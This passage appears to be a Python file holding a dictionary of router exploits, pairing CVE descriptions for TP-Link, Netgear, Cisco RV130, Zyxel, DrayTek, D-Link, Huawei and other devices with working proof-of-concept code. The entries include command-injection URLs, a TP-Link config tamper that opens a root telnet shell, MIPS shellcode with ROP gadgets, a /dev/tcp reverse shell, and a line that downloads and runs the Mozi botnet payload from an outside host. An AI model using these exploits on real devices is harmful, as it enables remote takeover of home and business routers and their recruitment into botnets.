f.read()\n\n\t\t# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script\n\t\tpayload = \'<service name="exploit">\n\'\n\t\tpayload += \'<enabled>on</enabled>\n\'\n\t\tpayload += \'<update_url>http://127.0.0.1/</update_url>\n\'\n\t\tpayload += \'<domain>x.example.org</domain>\n\'\n\t\tpayload += \'<username>X</username>\n\'\n\t\tpayload += \'<password>X</password>\n\'\n\t\tpayload += \'<ip_source>script</ip_source>\n\'\n\t\tpayload += \'<ip_script>%s</ip_script>\n\' % (command.replace(\'<\',\'&lt;\').replace(\'&\',\'&amp;\'))\n\t\tpayload += \'<interface>internet</interface>\n\' # not worked for other interfaces\n\t\tpayload += \'<retry_interval>5</retry_interval>\n\'\n\t\tpayload += \'<retry_unit>seconds</retry_unit>\n\'\n\t\tpayload += \'<retry_times>3</retry_times>\n\'\n\t\tpayload += \'<check_interval>12</check_interval>\n\'\n\t\tpayload += \'<check_unit>hours</check_unit>\n\'\n\t\tpayload += \'<force_interval>30</force_interval>\n\'\n\t\tpayload += \'<force_unit>days</force_unit>\n\'\n\t\tpayload += \'</service>\n\'\n\n\t\tif \'<service name="exploit">\' in xml_content:\n\t\t\txml_content = re.sub(r\'<service name="exploit">[\\s\\S]+?</service>\n</ddns>\', \'%s</ddns>\'%(payload), xml_content, 1)\n\t\telse:\n\t\t\txml_content = xml_content.replace(\'</service>\n</ddns>\', \'</service>\n%s</ddns>\'%(payload), 1)\n\t\twith open(xml_path, \'w\') as f:\n\t\t\tf.write(xml_content)\n\n\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument(\'-t\', metavar=\'target\', help=\'ip address of tp-link router\', required=True)\narg_parser.add_argument(\'-p\', metavar=\'password\', required=True)\narg_parser.add_argument(\'-b\', action=\'store_true\', help=\'only backup and decrypt config\')\narg_parser.add_argument(\'-r\', metavar=\'backup_directory\', help=\'only encrypt and restore directory with decrypted config\')\narg_parser.add_argument(\'-c\', metavar=\'cmd\', default=\'/usr/sbin/telnetd -l /bin/login.sh\', help=\'command to execute\')\nargs = arg_parser.parse_args()\n\nclient = WebClient(args.t, args.p)\nparser = None\n\nif not args.r:\n\tprint(\'[*] downloading config file ...\')\n\tfilepath = client.download_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'backup\'})\n\tif not filepath:\n\t\tsys.exit(-1)\n\n\tprint(\'[*] decrypting config file "%s" ...\'%(filepath))\n\tparser = BackupParser(filepath)\n\tparser.decrypt_config()\n\tprint(\'[+] successfully decrypted into directory "%s"\'%(parser.decrypted_path))\n\nif not args.b and not args.r:\n\tfilepath = \'%s_modified\'%(parser.decrypted_path)\n\tos.rename(parser.decrypted_path, filepath)\n\tparser.decrypted_path = os.path.abspath(filepath)\n\tparser.encrypted_path = \'%s.bin\'%(filepath)\n\tparser.modify_config(args.c)\n\tprint(\'[+] modified directory with decrypted config "%s" ...\'%(parser.decrypted_path))\n\nif not args.b:\n\tif parser is None:\n\t\tparser = BackupParser(\'%s.bin\'%(args.r.rstrip(\'/\')))\n\tprint(\'[*] encrypting directory with modified config "%s" ...\'%(parser.decrypted_path))\n\tparser.encrypt_config()\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'read\'})\n\ttimeout = data[\'data\'][\'totaltime\'] if data[\'success\'] else 180\n\tprint(\'[*] uploading modified config file "%s"\'%(parser.encrypted_path))\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'restore\'}, {\'archive\':open(parser.encrypted_path,\'rb\')})\n\tif not data[\'success\']:\n\t\tprint(\'[!] unexpected response\')\n\t\tprint(data)\n\t\tsys.exit(-1)\n\n\tprint(\'[+] config file successfully uploaded\')\n\tprint(\'[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!\'%(args.t)\n']
}


model_exp_dic["RT-AC68U"] = {
    "CVE-2018-1160":
["Netatalk before 3.1.12 is vulnerable to an out of bounds write in dsi_opensess.c. This is due to lack of bounds checking on attacker controlled data. A remote unauthenticated attacker can leverage this vulnerability to achieve arbitrary code execution.\n['http://packetstormsecurity.com/files/152440/QNAP-Netatalk-Authentication-Bypass.html', 'https://attachments.samba.org/attachment.cgi?id=14735', 'https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160/', 'https://www.tenable.com/security/research/tra-2018-48', 'http://www.securityfocus.com/bid/106301', 'https://www.debian.org/security/2018/dsa-4356', 'https://www.exploit-db.com/exploits/46034/', 'https://www.exploit-db.com/exploits/46048/', 'https://www.exploit-db.com/exploits/46675/']", '\nno\n']
}


model_exp_dic["R7000"] = {
    "cve-2016-6277":
["NETGEAR R6250 before 1.0.4.6.Beta, R6400 before 1.0.1.18.Beta, R6700 before 1.0.1.14.Beta, R6900, R7000 before 1.0.7.6.Beta, R7100LG before 1.0.0.28.Beta, R7300DST before 1.0.0.46.Beta, R7900 before 1.0.1.8.Beta, R8000 before 1.0.3.26.Beta, D6220, D6400, D7000, and possibly other routers allow remote attackers to execute arbitrary commands via shell metacharacters in the path info to cgi-bin/.\n['http://packetstormsecurity.com/files/155712/Netgear-R6400-Remote-Code-Execution.html', 'http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/', 'https://kalypto.org/research/netgear-vulnerability-expanded/', 'http://www.securityfocus.com/bid/94819', 'https://www.kb.cert.org/vuls/id/582384', 'https://www.exploit-db.com/exploits/40889/', 'https://www.exploit-db.com/exploits/41598/']", '\nhttp://:8443/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://k8gege.org:800/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m\n'],
    "CVE-2020-27867":
["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.\n['https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/', 'https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/']", '\nhttp://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20k8gege.org\n']
}

model_exp_dic["DIR-885L"] = {
    "CVE-2016-6563":
["Processing malformed SOAP messages when performing the HNAP Login action causes a buffer overflow in the stack in some D-Link DIR routers. The vulnerable XML fields within the SOAP body are: Action, Username, LoginPassword, and Captcha. The following products are affected: DIR-823, DIR-822, DIR-818L(W), DIR-895L, DIR-890L, DIR-885L, DIR-880L, DIR-868L, and DIR-850L.\n['http://www.securityfocus.com/bid/94130', 'https://www.kb.cert.org/vuls/id/677427', 'https://www.exploit-db.com/exploits/40805/', 'http://seclists.org/fulldisclosure/2016/Nov/38']", '\nmsf search CVE-2016-6563\n']
}

model_exp_dic["huawei_HG532"] = {
    "CVE-2017-17215":
["Huawei HG532 with some customized versions has a remote code execution vulnerability. An authenticated attacker could send malicious packets to port 37215 to launch attacks. Successful exploit could lead to the remote execution of arbitrary code.\n['http://www.securityfocus.com/bid/102344']", '\nimport requests\n\nheaders = {\n    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"\n}\n\ndata = \'\'\'<?xml version="1.0" ?>\n <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\n   <NewStatusURL>COMMAND</NewStatusURL>\n   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>\n  </u:Upgrade>\n </s:Body>\n</s:Envelope>\n\'\'\'\nrequests.post(\'http://192.168.150.9:37215/ctrlt/DeviceUpgrade_1\',headers=headers,data=data)\n']
}

model_exp_dic["Cisco_RV130"] = {
    "CVE-2020-3331":
["A vulnerability in the web-based management interface of Cisco RV110W Wireless-N VPN Firewall and Cisco RV215W Wireless-N VPN Router could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device. The vulnerability is due to improper validation of user-supplied input data by the web-based management interface. An attacker could exploit this vulnerability by sending crafted requests to a targeted device. A successful exploit could allow the attacker to execute arbitrary code with the privileges of the root user.\n['https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-code-exec-wH3BNFb']", '\nfrom pwn import *\nimport thread,requests\ncontext(arch=\'mips\',endian=\'little\',os=\'linux\')\nio     = listen(31337)\nlibc   = 0x2af98000\njmp_a0 = libc + 0x0003D050  # move  $t9,$a0             ; jalr  $a0\njmp_s0 = libc + 0x000257A0  # addiu $a0,$sp,0x38+var_20 ; jalr  $s0 \n\nshellcode = "\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04\\x28"\nshellcode += "\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01"\nshellcode += "\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01"\nshellcode += "\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x09\\x09\\x01"\nshellcode += "\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xc9\\x0f\\x02\\x24"\nshellcode += "\\x0c\\x09\\x09\\x01\\x79\\x69\\x05\\x3c\\x01\\xff\\xa5\\x34\\x01\\x01\\xa5\\x20"\nshellcode += "\\xf8\\xff\\xa5\\xaf\\x01\\x64\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc\\xff\\xa5\\xaf"\nshellcode += "\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24"\nshellcode += "\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08\\x35\\xec\\xff\\xa8\\xaf"\nshellcode += "\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff\\xa8\\xaf\\xff\\xff\\x07\\x28"\nshellcode += "\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23"\nshellcode += "\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28"\nshellcode += "\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01"\n\npayload = "status_guestnet.asp"+\'a\'*49+p32(jmp_a0)+0x20*\'a\'+p32(jmp_s0)+0x18*\'a\'+shellcode\nparamsPost = {"cmac":"12:af:aa:bb:cc:dd","submit_button":payload,"cip":"192.168.1.100"}\n\ndef attack():\n    try: requests.post("https://192.168.1.1/guest_logout.cgi", data=paramsPost, verify=False,timeout=1)\n    except: pass\n\nthread.start_new_thread(attack,())\nio.wait_for_connection()\nlog.success("getshell")\nio.interactive()\n']
}

model_exp_dic["Zyxel_USG_FLEX_500"] = {
    "CVE-2022-30525":
["A OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.\n['http://packetstormsecurity.com/files/167176/Zyxel-Remote-Command-Execution.html', 'http://packetstormsecurity.com/files/167182/Zyxel-Firewall-ZTP-Unauthenticated-Command-Injection.html', 'http://packetstormsecurity.com/files/167372/Zyxel-USG-FLEX-5.21-Command-Injection.html', 'http://packetstormsecurity.com/files/168202/Zyxel-Firewall-SUID-Binary-Privilege-Escalation.html', 'https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml']", 
"""
curl -kv --insecure -X POST -H "Content-Type: application/json" -d '{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c \"bash -i &>/dev/tcp/127.0.0.1/8888 <&1;\";","data":"hi"}' https://74.105.155.163//ztp/cgi-bin/handler
\nPOST /ztp/cgi-bin/handler HTTP/1.1\nHost: host\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nContent-Type: application/json\nConnection: close\nContent-Length: 165\n\n{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"\n:"1","vlanid":"5","mtu":";Command;","data":"hi"}\n
"""
]
}

model_exp_dic["Buffalo_WSR-2533DHPL"] = {
    "CVE-2021-20090":
["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/', 'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'],
    "CVE-2021-20091":
["The web interfaces of Buffalo WSR-2533DHPL2 firmware version &lt;= 1.02 and WSR-2533DHP3 firmware version &lt;= 1.24 do not properly sanitize user input. An authenticated remote attacker could leverage this vulnerability to alter device configuration, potentially gaining remote code execution.\n['https://www.tenable.com/security/research/tra-2021-13', 'https://www.tenable.com/security/research/tra-2021-13']", '\ncurl --include -X POST http://<ip>/js/..%2fapply_abstract.cgi -H "Referer: http://<ip>/ping.html" --data "action=start_ping&httoken=<valid httoken>&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=<ip>%0ACommand_injection=1&ARC_ping_status=0&TMP_Ping_Type=4"\n']
}


model_exp_dic["InRouter615-S"] = {
    "CVE-2021-38470":
["InHand Networks IR615 Router's Versions 2.3.0.r4724 and 2.3.0.r4870 are vulnerable to an attacker using a ping tool to inject commands into the device. This may allow the attacker to remotely run commands on behalf of the device.\n['https://us-cert.cisa.gov/ics/advisories/icsa-21-280-05', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-280-05']", '\nPOST /ping.cgi HTTP/1.1\nHost: 192.168.15.110\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 37\nOrigin: http://192.168.15.110\nConnection: close\nReferer: http://192.168.15.110/tools-ping.jsp\nCookie: web_session=6a7c22b2; web_status_system_refresh=3; web_pingaddr=123; web_pingcount=4; web_pingsize=32; web_pingoption=; web_traceaddr=123123; web_tracehops=20; web_tracewait=3; web_traceproto=0; web_traceoption=\n\naddr=123&count=4&size=32;ls;&option=1\n']
}


model_exp_dic["DrayTek_Vigor2960"] = {
    "CVE-2020-8515":
["DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in Vigor3900/2960/300B v1.5.1.\n['http://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html', 'https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html', 'https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/']", '\nfrom sys import argv\nfrom base64 import b64encode\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nheaders = requests.utils.default_headers()\nheaders["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"\ndata = "action=login&keyPath=%27%0A%2fbin%2f" + "pwd"+ "%0A%27&loginUser=a&loginPwd=a"\nurl = {\n    "root": "http://192.168.1.1",\n    "cgi": {\n        "root": "/cgi-bin",\n        "uri": {\n            "mf": "/mainfunction.cgi",\n        }\n    }\n}\n\ndef build_url(p1, p2=None):\n    if p2:\n        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]\n    else:\n        return url["root"] + url[p1]\n\n# requests.adapters.DEFAULT_RETRIES = 5\n# session = requests.session()\n# session.keep_alive = False\nres = requests.post(build_url("cgi", "mf"), data=data, headers=headers, verify=False)\nprint(res.text)\n']
}


model_exp_dic["DrayTek_Vigor2960"] = {
    "CVE-2020-8515":
["DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in Vigor3900/2960/300B v1.5.1.\n['http://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html', 'https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html', 'https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/']", '\nfrom sys import argv\nfrom base64 import b64encode\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nheaders = requests.utils.default_headers()\nheaders["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"\ndata = "action=login&keyPath=%27%0A%2fbin%2f" + "pwd"+ "%0A%27&loginUser=a&loginPwd=a"\nurl = {\n    "root": "http://192.168.1.1",\n    "cgi": {\n        "root": "/cgi-bin",\n        "uri": {\n            "mf": "/mainfunction.cgi",\n        }\n    }\n}\n\ndef build_url(p1, p2=None):\n    if p2:\n        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]\n    else:\n        return url["root"] + url[p1]\n\n# requests.adapters.DEFAULT_RETRIES = 5\n# session = requests.session()\n# session.keep_alive = False\nres = requests.post(build_url("cgi", "mf"), data=data, headers=headers, verify=False)\nprint(res.text)\n'],
    "CVE-2020-14472":
["On DrayTek Vigor3900, Vigor2960, and Vigor300B devices before 1.5.1, cgi-bin/mainfunction.cgi/cvmcfgupload allows remote command execution via shell metacharacters in a filename when the text/x-python-script content type is used, a different issue than CVE-2020-14472.\n['https://github.com/CLP-team/Vigor-Commond-Injection', 'https://www.draytek.com/about/security-advisory']", '\nfrom sys import argv\nfrom base64 import b64encode\nimport requests\n\nbuf = b64encode(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")\n\nheader = {\n    "Content-Type": "application/raw"\n    "Authorization": "Basic "+buf\n}\nurl = {\n    "root": "http://192.168.1.1",\n    "cgi": {\n        "root": "/cgi-bin",\n        "uri": {\n            "mf": "/mainfunction.cgi",\n        }\n    }\n}\n\ndef build_url(p1, p2=None):\n    if p2:\n        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]\n    else:\n        return url["root"] + url[p1]\n\nsession = requests.session()\nsession.post(build_url("cgi", "mf")+"/login", headers=header)\n'],
    "CVE-2020-14473":
["Stack-based buffer overflow vulnerability in Vigor3900, Vigor2960, and Vigor300B with firmware before 1.5.1.1.\n['https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md']", '\nfrom sys import argv\nfrom base64 import b64encode\nimport requests\n\ndata = {\n    "URL": "xxx",\n    "HOST": "https://xxx",\n    "action": "apply",\n    "config": ";whoami"\n}\nheader = {\n    "Content-Type": "application/raw"\n}\nurl = {\n    "root": "https://xx",\n    "cgi": {\n        "root": "/cgi-bin",\n        "uri": {\n            "mf": "/mainfunction.cgi",\n        }\n    }\n}\n\ndef build_url(p1, p2=None):\n    if p2:\n        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]\n    else:\n        return url["root"] + url[p1]\n\nsession = requests.session()\nsession.post(build_url("cgi", "mf"), data=data, headers=header)\n']
}


model_exp_dic["DIR-878"] = {
    "CVE-2019-8316":
        ["An issue was discovered on D-Link DIR-878 devices with firmware 1.12A1. This issue is a Command Injection allowing a remote attacker to execute arbitrary code, and get a root shell. A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted /HNAP1 POST request. This occurs when any HNAP API function triggers a call to the system function with untrusted input from the request body for the SetWebFilterSettings API function, as demonstrated by shell metacharacters in the WebFilterURLs field.",""],
    "CVE-2019-9125":
        ["An issue was discovered on D-Link DIR-878 1.12B01 devices. Because strncpy is misused, there is a stack-based buffer overflow vulnerability that does not require authentication via the HNAP_AUTH HTTP header.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-267/']",
        """
import requests
import sys
import struct
import time
from pwn import *

def syscmd1(a):
    data='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    p=remote('ip'port)
    z=len(data)
    payload=''
    payload+='POST /HNAP1/ HTTP/1.1\\r\\n'
    payload+='Host: 192.168.0.1\\r\\n'
    payload+='Connection: close\\r\\n'
    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\\r\\n'
    payload+='Accept-Encoding: gzip, deflate\\r\\n'
    payload+='Accept: */*\\r\\n'
    payload+='Origin: http://192.168.0.1\\r\\n'
    payload+='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
    payload+='User-Agent: python-requests/2.18.4\\r\\n'
    payload+='Content-Length: '+str(z)+'\\r\\n'
    payload+='Content-Type: text/xml; charset=UTF-8\\r\\n'
    payload+='Referer: http://ip/info/Login.html\\r\\n'
    payload+='Accept-Language: zh-CN,zh;q=0.9\\r\\n'
    payload+='X-Requested-With: XMLHttpRequest\\r\\n'
    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\\r\\n'
    payload+='\\r\\n'
    payload+=data
    p.send(payload)
    print p.recv(1024)
    p.close()

if __name__ == "__main__":
            payload='A'*0x400
            syscmd1(payload)
        """
        ]
}

model_exp_dic["TPLINK_Archer_A7_V5"] = {
    "CVE-2021-42232":
        ["TP-Link Archer A7 Archer A7(US)_V5_210519 is affected by a command injection vulnerability in /usr/bin/tddp. The vulnerability is caused by the program taking part of the received data packet as part of the command. This will cause an attacker to execute arbitrary commands on the router.", 
        """
from pwn import *
from socket import *
import sys

tddp_port = 1040
recv_port = 12345
ip = sys.argv[1]
command = sys.argv[2]

s_send = socket(AF_INET,SOCK_DGRAM,0)
s_recv = socket(AF_INET,SOCK_DGRAM,0)

s_recv.bind(('',12345))

payload = '\x01\x31'.ljust(12,'\x00')
payload+= "123|%s&&echo ;123"%(command)

s_send.sendto(payload,(ip,tddp_port))
s_send.close()

res,addr = s_recv.recvfrom(1024)
print res
        """]
}

# |chmod${IFS}777${IFS}/tmp/bd
# |/tmp/bd

model_exp_dic["Netgear_D7000v1"] = {
    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133'\n'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
                      'curl -k -v "http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList"'
                      ]   
}


model_exp_dic["Netgear_R6330"] = {
    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133'\n'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
                      'http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList'
                      ]   
}


model_exp_dic["Netgear_MBR1515"] = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}

model_exp_dic["Netgear_MBR1516"] = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}


model_exp_dic["Netgear_DGN2200M"]= {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
